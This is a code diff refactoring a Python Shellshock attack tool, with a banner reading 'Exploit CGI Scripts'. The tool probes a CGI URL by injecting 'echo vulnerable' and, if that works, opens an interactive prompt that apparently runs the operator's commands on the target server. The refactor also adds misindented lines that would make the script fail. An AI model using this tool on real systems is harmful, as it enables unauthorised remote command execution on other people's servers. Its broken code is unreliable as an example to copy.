@@ -33,19 +33,17 @@ def checkhost(url):
     request = req.get(url)
     if request.status_code >= 400:
         return False
-    else:
-        return True
+    return True
 
 
-def Isvulnerable(url):
+def isvulnerable(url):
     response = getreq(url, 'echo vulnerable')
     if 'vulnerable' in response:
         print("\n[\033[92m+\033[0m] \033[92mTarget seems to be vulnerable.\033[0m \n")
         return True
-    else:
-        print(
-            "\n[\033[91m-\033[0m] \033[91mTarget seems not to be vulnerable.\033[0m\n")
-        return False
+   print(
+        "\n[\033[91m-\033[0m] \033[91mTarget seems not to be vulnerable.\033[0m\n")
+   return False
 
 
 def clearscrn():
@@ -59,19 +57,17 @@ print("""
         ╔═╗╦ ╦╔═╗╦  ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═
         ╚═╗╠═╣║╣ ║  ║  ╚═╗╠═╣║ ║║  ╠╩╗
         ╚═╝╩ ╩╚═╝╩═╝╩═╝╚═╝╩ ╩╚═╝╚═╝╩ ╩
-            Developed by sAsPeCt
+            Developed by @sAsPeCt
             Exploit CGI Scripts
         """)
 
 rhosts = input("Provide the full URL to the CGI Script (Include http://): ")
 try:
-    is_alive = checkhost(rhosts)
-    if not is_alive:
+    if not checkhost(rhosts):
         print(
             "\n\033[91mHost seems down or you don't have access to this resource.\033[0m")
     else:
-        is_vulnerable = Isvulnerable(rhosts)
-        if is_vulnerable:
+        if isvulnerable(rhosts):
             while True:
                 cmd = input("$ ")
                 if cmd == 'exit':
